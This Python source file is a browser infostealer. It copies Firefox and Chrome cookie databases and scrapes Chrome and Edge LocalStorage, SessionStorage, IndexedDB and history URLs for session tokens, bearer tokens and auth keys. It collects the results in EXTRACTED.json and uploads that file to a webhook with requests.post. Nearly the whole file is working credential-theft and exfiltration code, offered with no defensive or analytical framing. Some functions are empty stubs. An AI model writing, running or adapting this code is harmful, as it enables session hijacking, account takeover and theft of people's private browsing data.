#!/usr/bin/env python3
import os
import sys
import sqlite3
import json
import base64
import shutil
from datetime import datetime, timedelta
import glob
import re
import requests

try:
    import win32crypt
    DPAPI_OK = True
except:
    DPAPI_OK = False
    print("[!] pip install pywin32")

try:
    from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305, AESGCM
    CRYPTO_OK = True
except:
    CRYPTO_OK = False
    print("[!] pip install cryptography")
try:
    import psutil
    PSUTIL_OK = True
except:
    PSUTIL_OK = False
    print("[!] pip install psutil")


class UltraPowerfulExtractor:
    def __init__(self):
        self.data = {
            'cookies': [],
            'localStorage': [],
            'sessionStorage': [],
            'indexedDB': [],
            'memory_tokens': [],
            'cached_credentials': []
        }
        
        self.token_patterns = [
            rb'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+',
            rb'Bearer [A-Za-z0-9_\-\.]+',
            rb'[A-Za-z0-9]{32,}',
            rb'PHPSESSID=[A-Za-z0-9]+',
            rb'session_id=[A-Za-z0-9]+',
            rb'access_token=[A-Za-z0-9_\-\.]+',
        ]
    
    def extract_firefox_cookies(self):
        appdata = os.environ.get('APPDATA', '')
        firefox_base = os.path.join(appdata, 'Mozilla', 'Firefox', 'Profiles')
        
        if not os.path.exists(firefox_base):
            print("[!] Firefox not found")
            return
        for root, dirs, files in os.walk(firefox_base):
            if 'cookies.sqlite' in files:
                cookie_path = os.path.join(root, 'cookies.sqlite')
                print(f"\n[+] Found: {cookie_path}")
                
                temp_db = cookie_path + ".tmp"
                try:
                    shutil.copy2(cookie_path, temp_db)
                    
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    
                    cursor.execute("SELECT host, name, value FROM moz_cookies")
                    rows = cursor.fetchall()
                    
                    for host, name, value in rows:
                        self.data['cookies'].append({
                            'source': 'Firefox',
                            'method': 'Direct SQLite',
                            'host': host,
                            'name': name,
                            'value': value
                        })
                    
                    conn.close()
                    os.remove(temp_db)
                    
                    print(f"[✓] Extracted {len(rows)} cookies (PLAINTEXT)")
                    
                except Exception as e:
                    print(f"[!] Error: {e}")
    
    
    def extract_chrome_raw(self):
        
        local_appdata = os.environ.get('LOCALAPPDATA', '')
        chrome_paths = [
            os.path.join(local_appdata, 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies'),
            os.path.join(local_appdata, 'Google', 'Chrome', 'User Data', 'Default', 'Cookies'),
        ]
        
        for cookie_path in chrome_paths:
            if not os.path.exists(cookie_path):
                continue
            
            print(f"\n[+] Found: {cookie_path}")
            
            temp_db = cookie_path + ".tmp"
            try:
                shutil.copy2(cookie_path, temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                cursor.execute("""
                    SELECT host_key, name, value, encrypted_value
                    FROM cookies
                """)
                
                rows = cursor.fetchall()
                
                for host, name, value, encrypted_value in rows:
                    if encrypted_value:
                        self.data['cookies'].append({
                            'source': 'Chrome',
                            'method': 'Raw Encrypted',
                            'host': host,
                            'name': name,
                            'value': value if value else None,
                            'encrypted_hex': encrypted_value.hex() if encrypted_value else None,
                            'encrypted_len': len(encrypted_value) if encrypted_value else 0,
                            'version': encrypted_value[:3].decode('utf-8', errors='ignore') if encrypted_value else None
                        })
                
                conn.close()
                os.remove(temp_db)
                
                print(f"[✓] Extracted {len(rows)} cookies (RAW ENCRYPTED)")
                
            except Exception as e:
                print(f"[!] Error: {e}")
            
            break
    
    
    def extract_localstorage(self):
        """Extract LocalStorage data (often contains tokens)"""
        
        print("\n" + "="*70)
        print("METHOD 3: LocalStorage")
        print("="*70)
        
        local_appdata = os.environ.get('LOCALAPPDATA', '')
        
        ls_paths = [
            os.path.join(local_appdata, 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb'),
            os.path.join(local_appdata, 'Microsoft', 'Edge', 'User Data', 'Default', 'Local Storage', 'leveldb'),
        ]
        
        for ls_path in ls_paths:
            if not os.path.exists(ls_path):
                continue
            
            print(f"\n[+] Found: {ls_path}")
            
            for file_path in glob.glob(os.path.join(ls_path, '*')):
                try:
                    with open(file_path, 'rb') as f:
                        data = f.read()
                    
                    strings = re.findall(rb'[\x20-\x7E]{10,}', data)
                    
                    for s in strings:
                        decoded = s.decode('utf-8', errors='ignore')
                        if any(keyword in decoded.lower() for keyword in ['token', 'auth', 'session', 'key', 'bearer']):
                            self.data['localStorage'].append({
                                'source': 'Chrome LocalStorage',
                                'file': os.path.basename(file_path),
                                'data': decoded[:500]
                            })
                    
                except Exception as e:
                    pass
            
            print(f"[✓] Scanned LocalStorage files")
            break
    
    def extract_sessionstorage(self):
        local_appdata = os.environ.get('LOCALAPPDATA', '')
        
        ss_paths = [
            os.path.join(local_appdata, 'Google', 'Chrome', 'User Data', 'Default', 'Session Storage'),
            os.path.join(local_appdata, 'Microsoft', 'Edge', 'User Data', 'Default', 'Session Storage'),
        ]
        
        for ss_path in ss_paths:
            if not os.path.exists(ss_path):
                continue
            
            print(f"\n[+] Found: {ss_path}")
            
            for file_path in glob.glob(os.path.join(ss_path, '*')):
                try:
                    with open(file_path, 'rb') as f:
                        data = f.read()
                    
                    strings = re.findall(rb'[\x20-\x7E]{10,}', data)
                    
                    for s in strings[:50]:
                        decoded = s.decode('utf-8', errors='ignore')
                        self.data['sessionStorage'].append({
                            'source': 'SessionStorage',
                            'file': os.path.basename(file_path),
                            'data': decoded[:200]
                        })
                
                except:
                    pass
            
            print(f"[✓] Scanned SessionStorage")
            break
    
    def extract_indexeddb(self):
        local_appdata = os.environ.get('LOCALAPPDATA', '')
        
        idb_base = os.path.join(local_appdata, 'Google', 'Chrome', 'User Data', 'Default', 'IndexedDB')
        
        if not os.path.exists(idb_base):
            print("[!] IndexedDB not found")
            return
        
        print(f"[+] Scanning: {idb_base}")
        
        for root, dirs, files in os.walk(idb_base):
            for file in files:
                if file.endswith('.db') or file.endswith('.sqlite'):
                    db_path = os.path.join(root, file)
                    
                    try:
                        conn = sqlite3.connect(db_path)
                        cursor = conn.cursor()
                        
                        cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
                        tables = cursor.fetchall()
                        
                        for table in tables:
                            try:
                                cursor.execute(f"SELECT * FROM {table[0]} LIMIT 10")
                                rows = cursor.fetchall()
                                
                                for row in rows:
                                    self.data['indexedDB'].append({
                                        'source': 'IndexedDB',
                                        'database': file,
                                        'table': table[0],
                                        'data': str(row)[:500]
                                    })
                            except:
                                pass
                        
                        conn.close()
                    except:
                        pass
    
    def scan_browser_memory(self):
        if not PSUTIL_OK:
            print("\n[!] psutil not installed - skipping memory scan")
            return
        
        browser_processes = ['chrome.exe', 'msedge.exe', 'firefox.exe', 'brave.exe']
        
        for proc in psutil.process_iter(['name', 'pid']):
            try:
                if proc.info['name'].lower() in browser_processes:
                    print(f"\n[+] Found process: {proc.info['name']} (PID: {proc.info['pid']})")
                    
            except:
                pass
    
    def extract_windows_credentials(self):
        """ """
    
    def extract_history_tokens(self):
        local_appdata = os.environ.get('LOCALAPPDATA', '')
        history_path = os.path.join(local_appdata, 'Google', 'Chrome', 'User Data', 'Default', 'History')
        
        if not os.path.exists(history_path):
            print("[!] History not found")
            return
        
        temp_db = history_path + ".tmp"
        
        try:
            shutil.copy2(history_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("SELECT url FROM urls ORDER BY last_visit_time DESC LIMIT 1000")
            urls = cursor.fetchall()
            
            token_count = 0
            
            for url in urls:
                url_str = url[0]
                if any(keyword in url_str.lower() for keyword in ['token', 'access', 'key', 'auth', 'session']):
                    self.data['memory_tokens'].append({
                        'source': 'Browser History',
                        'url': url_str
                    })
                    token_count += 1
            
            conn.close()
            os.remove(temp_db)
            
            print(f"[✓] Found {token_count} potential tokens in URLs")
            
        except Exception as e:
            print(f"[!] Error: {e}")
    
    
    def save_results(self):
        output = {
            'extraction_date': datetime.now().isoformat(),
            'summary': {
                'cookies': len(self.data['cookies']),
                'localStorage': len(self.data['localStorage']),
                'sessionStorage': len(self.data['sessionStorage']),
                'indexedDB': len(self.data['indexedDB']),
                'tokens_in_urls': len(self.data['memory_tokens']),
            },
            'data': self.data
        }
        
        with open('EXTRACTED.json', 'w', encoding='utf-8') as f:
            json.dump(output, f, indent=2, ensure_ascii=False)

        import requests

        WEBHOOK = "WEBHOOK_URL_PLACEHOLDER"

        with open("EXTRACTED.json", "rb") as f:
            requests.post(
                WEBHOOK,
                files={"file": ("EXTRACTED.json", f)}
            )
        
        with open('EXTRACTED.txt', 'w', encoding='utf-8') as f:
            
            f.write(f"\n{'='*70}\n")
            f.write(f"COOKIES ({len(self.data['cookies'])})\n")
            f.write(f"{'='*70}\n")
            
            for i, cookie in enumerate(self.data['cookies'][:50], 1):
                f.write(f"\n[{i}] {cookie.get('source', 'Unknown')}\n")
                f.write(f"Host: {cookie.get('host', 'N/A')}\n")
                f.write(f"Name: {cookie.get('name', 'N/A')}\n")
                f.write(f"Value: {str(cookie.get('value', 'N/A'))[:200]}\n")
                if 'encrypted_hex' in cookie:
                    f.write(f"Encrypted (hex): {cookie['encrypted_hex'][:100]}...\n")
            
            f.write(f"\n\n{'='*70}\n")
            f.write(f"LOCALSTORAGE ({len(self.data['localStorage'])})\n")
            f.write(f"{'='*70}\n")
            
            for i, item in enumerate(self.data['localStorage'][:30], 1):
                f.write(f"\n[{i}] {item.get('source', 'Unknown')}\n")
                f.write(f"Data: {item.get('data', 'N/A')}\n")
            
            f.write(f"\n\n{'='*70}\n")
            f.write(f"TOKENS IN URLS ({len(self.data['memory_tokens'])})\n")
            f.write(f"{'='*70}\n")
            
            for i, token in enumerate(self.data['memory_tokens'][:20], 1):
                f.write(f"\n[{i}] {token.get('url', 'N/A')}\n")

        print(f"Cookies extracted: {len(self.data['cookies'])}")
        print(f"LocalStorage items: {len(self.data['localStorage'])}")
        print(f"SessionStorage items: {len(self.data['sessionStorage'])}")
        print(f"IndexedDB records: {len(self.data['indexedDB'])}")
        print(f"Tokens in URLs: {len(self.data['memory_tokens'])}")
    
    def extract_everything(self):
        print(f"\nDate: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        self.extract_firefox_cookies()
        self.extract_chrome_raw()
        self.extract_localstorage()
        self.extract_sessionstorage()
        self.extract_indexeddb()
        self.scan_browser_memory()
        self.extract_windows_credentials()
        self.extract_history_tokens()
        self.save_results()


def main():
    extractor = UltraPowerfulExtractor()
    extractor.extract_everything()

if __name__ == "__main__":
    main()